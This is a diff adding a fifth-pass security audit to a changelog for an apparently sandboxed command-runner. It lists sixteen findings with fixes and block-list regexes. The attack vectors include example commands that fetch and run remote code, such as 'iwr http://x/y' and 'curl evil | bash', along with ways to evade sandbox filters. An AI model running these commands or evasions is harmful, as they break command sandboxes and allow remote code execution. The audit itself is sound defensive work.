@@ -392,3 +392,148 @@ All 13 fourth-pass findings are closed in a single commit (`b785e46`):
 | F-LT-33 | HIGH | `buildSafeEnv` flipped to allowlist model |
 | F-LT-34 | MEDIUM | Sensitive directory guard in `list_directory` |
 | F-LT-35 | MEDIUM | `realpathSync` fail-closed; ENOENT surfaced separately |
+
+---
+
+## Fifth Pass — 2026-04-18 (S51 review → S52 close)
+
+**Result:** FAIL (prior to fixes). 16 findings, including 6 CRITICAL.
+Reviewer target: v1.7.0. Close-out version: **v1.7.1**.
+
+### F-LT-36 — CRITICAL — PowerShell flag-tolerant positional bypass
+**Attack vector:** `powershell -NoProfile -Command Invoke-Expression (iwr http://x/y)` slips past positional scanner because the scanner only looked at the immediate next arg after `powershell`. Any flag between `powershell` and the payload defeats the check.
+**Fix:** Flag-tolerant regex `\bp(ower)?sh(ell)?(\.exe)?\b(?:\s+[-\/][^\s]+)*\s+(?![-\/])[^\s]+` walks past any number of leading flags and rejects the first non-flag token. Mirror patterns for `pwsh` + explicit `-File`/`-Command` detection anywhere in argv.
+**Status:** FIXED (v1.7.1)
+
+---
+
+### F-LT-37 — CRITICAL — `COMSPEC` passthrough enables arbitrary executable swap
+**Attack vector:** `COMSPEC` was in `SAFE_ENV_ALLOWLIST`, so callers could inject `COMSPEC=C:\attacker\fakecmd.exe`. Any child process that spawns `cmd.exe` by lookup (many Node/Git internals) would execute the attacker binary.
+**Fix:** Removed `COMSPEC` from allowlist. `buildSafeEnv` on win32 pins `COMSPEC = <SystemRoot>\System32\cmd.exe` explicitly.
+**Status:** FIXED (v1.7.1)
+
+---
+
+### F-LT-38 — MEDIUM — `list_directory` returns sensitive files in output
+**Attack vector:** Even after F-LT-34 blocked listing sensitive *directories*, listing a parent directory still revealed sensitive *children* (e.g. `.ssh/id_rsa`, `.aws/credentials`).
+**Fix:** Post-filter entries via `isSensitiveFile(fullPath) || isSensitiveFile(basename)` before populating results.
+**Status:** FIXED (v1.7.1)
+
+---
+
+### F-LT-39 — MEDIUM — `sed -i` (AMBER) has no size cap
+**Attack vector:** `sed -i 's/x/y/g' /huge/file` could rewrite arbitrarily large files, causing disk pressure / wall-time DoS while technically staying in AMBER.
+**Fix:** `statSync` the target path before AMBER dispatch; reject if size > 10 MB.
+**Status:** FIXED (v1.7.1)
+
+---
+
+### F-LT-40 — CRITICAL — Narrow interpreter list for `<interp> <script>` form
+**Attack vector:** Existing interpreter+script rule only covered ~5 interpreters. `deno run attack.ts`, `bun x.mjs`, `osascript hack.scpt`, `ruby pwn.rb`, `dotnet script evil.csx`, plus Node pre-hooks (`node --loader` / `--import` / `--require`) all bypassed.
+**Fix:** Broad interpreter regex covering: node, python[3w?], py, perl, ruby, php, bun, deno, tsx, ts-node, Rscript, lua[jit], scala, groovy, java, osascript, bash, zsh, sh — plus 20+ script extensions. Added `dotnet script`, node pre-hook flags (`--loader/--experimental-loader/--import/--require`), `npx tsx|ts-node|babel-node|esbuild-register|ts-script`, and `(bun|deno) run|exec|eval|repl <file>` subcommand form.
+**Status:** FIXED (v1.7.1)
+
+---
+
+### F-LT-41 — HIGH — Rename-to-executable bypass
+**Attack vector:** `ren readme.txt payload.ps1` (or `mv` / `move`) let attacker convert any writable file to an executable extension. The rename itself was not blocked; subsequent execution via a different code path (startup folder, task scheduler, existing interpreter pattern) would succeed.
+**Fix:** Added BLOCKED pattern rejecting `rename|ren|mv|move <anything>.(ps1|psm1|bat|cmd|vbs|wsf|wsh|js|mjs|cjs|ts|mts|cts|tsx|py|pyw|pl|rb|php|lua|exe|dll|msi|reg|lnk|com|scr|hta|jar)`.
+**Status:** FIXED (v1.7.1)
+
+---
+
+### F-LT-42 — CRITICAL — `cmd /c` positional bypass with interposed flags
+**Attack vector:** Same pattern as F-LT-36: `cmd /D /S /c "payload"` slipped past `cmd /c` detection because detection was strictly positional.
+**Fix:** Flag-tolerant regex `\bcmd(\.exe)?\b(?:\s+\/[a-zA-Z:][^\s]*)*\s+\/[cCkK]\b`.
+**Status:** FIXED (v1.7.1)
+
+---
+
+### F-LT-43 — CRITICAL — WSL launchers not blocked
+**Attack vector:** `ubuntu -c "curl evil | bash"`, `debian run …`, `wsl -d Alpine bash -c …`, and every distro launcher (kali, archwsl, opensuse-*, fedoraremix, oracle-linux, slespro, sles-N) could bridge into an unsandboxed Linux VM and run arbitrary shell.
+**Fix:** Blocked-pattern for launcher executable name: `(ubuntu[0-9]*|debian[0-9]*|kali(-linux)?|archwsl|alpine(wsl)?|opensuse-[a-z0-9.\-]+|fedoraremix|oracle-?linux\S*|slespro|sles-\d+|wsl)(\.exe)?`.
+**Status:** FIXED (v1.7.1)
+
+---
+
+### F-LT-44 — CRITICAL — PowerShell reflection / COM reflection bypass
+**Attack vector:** Seven reflection shapes executed arbitrary code without matching any existing COM or interpreter pattern: `[Type]::GetTypeFromProgID(…)`, `[Activator]::CreateInstance(…)`, `.InvokeMember(`, `[System.Reflection.*]`, `[Reflection.Assembly]::Load*`, `System.Management.Automation.*` raw references, `& ([type] …)` invocation.
+**Fix:** Seven new BLOCKED patterns, one per reflection shape.
+**Status:** FIXED (v1.7.1)
+
+---
+
+### F-LT-45 — HIGH — `git --output-directory` / `--output-indicator-*` file-write bypass
+**Attack vector:** Several git subcommands accept `--output-directory=<path>` or `--output-indicator-*=<path>` flags that write attacker-controlled content to disk. `validateGitArgv` did not reject them.
+**Fix:** Added `-o`, `--output-directory`, `--output-indicator-(new|old|context)` to `FORBIDDEN_GIT_FLAGS`, plus regex matches for the `=value` forms.
+**Status:** FIXED (v1.7.1)
+
+---
+
+### F-LT-46 — HIGH — `NPM_CONFIG_PREFIX` / `NODE_PATH` env leak
+**Attack vector:** Both were in `SAFE_ENV_ALLOWLIST`. An attacker setting `NPM_CONFIG_PREFIX=C:\attacker` during an `npm install -g` would redirect global install directory; `NODE_PATH=<attacker>` would let any `require('module')` resolve to attacker-controlled code.
+**Fix:** Removed both from allowlist. Child processes inherit neither.
+**Status:** FIXED (v1.7.1)
+
+---
+
+### F-LT-47 — HIGH — `.npmrc` cwd override + caller `--userconfig` / `--globalconfig` injection
+**Attack vector:** (a) Attacker-owned `.npmrc` in a work-dir could override registry, `ignore-scripts=false`, and other critical settings. (b) Caller could pass `--userconfig=<attacker>.npmrc` / `--globalconfig=<attacker>.npmrc` to `run_npm_command` and override config explicitly.
+**Fix:** Reject caller-supplied `--userconfig=` / `--globalconfig=` args. Force every `npm` invocation to append `--ignore-scripts --userconfig=<nullsink> --globalconfig=<nullsink> --registry=https://registry.npmjs.org/`. Null sink is `NUL` on win32 and `/dev/null` elsewhere.
+**Status:** FIXED (v1.7.1)
+
+---
+
+### F-LT-48 — CRITICAL — `python -c` / `python -` / `py -c` unblocked
+**Attack vector:** `python -c "import os; os.system('…')"` — plus `py -c`, `python -` (stdin as source), `python -x` (skip first line) — none were caught by BLOCKED_PATTERNS. Only `python -m …` was previously blocked.
+**Fix:** Six new patterns covering all inline / stdin / skip-first-line forms for `python`, `python3`, `pythonw`, `python3w`, and `py`.
+**Status:** FIXED (v1.7.1)
+
+---
+
+### F-LT-49 — MEDIUM — `realpathSync` ENOENT oracle + raw-path oracle
+**Attack vector:** `read_file` on an attacker-guessed path returned distinct error strings for ENOENT vs. pattern-block vs. permission-denied, leaking filesystem structure. Also, `isSensitiveFile` was only applied to the *resolved* realpath, not the raw input — so a non-existent path masquerading as sensitive would fall through.
+**Fix:** Added up-front `isSensitiveFile(raw filePath)` check before `realpathSync`. Unified error message for ENOENT / EACCES / EPERM to `"ERROR: File not accessible."` so no path-existence oracle remains.
+**Status:** FIXED (v1.7.1)
+
+---
+
+### F-LT-50 — MEDIUM — `git diff`/`git log` pre-flight does not split commit ranges
+**Attack vector:** `git diff A..B` and `git log A...B` pass a single argv token containing `..` / `...`. The pre-flight validator treated the whole `A..B` token as one ref and skipped per-ref validation, allowing crafted ref names to bypass individual checks.
+**Fix:** Pre-flight now splits on `...` (three dots) first, then `..` (two dots), validating each side independently.
+**Status:** FIXED (v1.7.1)
+
+---
+
+### F-LT-51 — MEDIUM — `validateAuth` uses non-constant-time comparison
+**Attack vector:** `token === AUTH_TOKEN` short-circuits on first differing byte. Network timing (repeated requests) could leak byte-by-byte content of the server's AUTH_TOKEN.
+**Fix:** Rewrote `validateAuth` to length-check then `crypto.timingSafeEqual` on UTF-8 byte buffers.
+**Status:** FIXED (v1.7.1)
+
+---
+
+## v1.7.1 Fix Summary
+
+All 16 fifth-pass findings closed in v1.7.1:
+
+| Finding | Severity | Resolution |
+|---|---|---|
+| F-LT-36 | CRITICAL | Flag-tolerant PowerShell positional scanner |
+| F-LT-37 | CRITICAL | `COMSPEC` removed from allowlist; pinned by `buildSafeEnv` |
+| F-LT-38 | MEDIUM   | `list_directory` filters sensitive children |
+| F-LT-39 | MEDIUM   | `sed -i` rejects targets > 10 MB |
+| F-LT-40 | CRITICAL | Broad interpreter+script pattern; node pre-hooks; bun/deno subcommands |
+| F-LT-41 | HIGH     | Rename-to-executable extension blocked |
+| F-LT-42 | CRITICAL | Flag-tolerant `cmd /c` scanner |
+| F-LT-43 | CRITICAL | WSL distro launchers blocked |
+| F-LT-44 | CRITICAL | Seven COM/reflection patterns blocked |
+| F-LT-45 | HIGH     | `--output-directory` / `--output-indicator-*` in `FORBIDDEN_GIT_FLAGS` |
+| F-LT-46 | HIGH     | `NPM_CONFIG_PREFIX` + `NODE_PATH` removed from allowlist |
+| F-LT-47 | HIGH     | `.npmrc` cwd override neutralized; caller config flags rejected |
+| F-LT-48 | CRITICAL | `python -c` / `-` / `-x` / `py -c` blocked |
+| F-LT-49 | MEDIUM   | Up-front sensitive check; unified "not accessible" error |
+| F-LT-50 | MEDIUM   | Commit-range split in pre-flight |
+| F-LT-51 | MEDIUM   | `crypto.timingSafeEqual` in `validateAuth` |
+
+Test coverage: 81/81 passing (`src/__tests__/security.test.ts`).
+
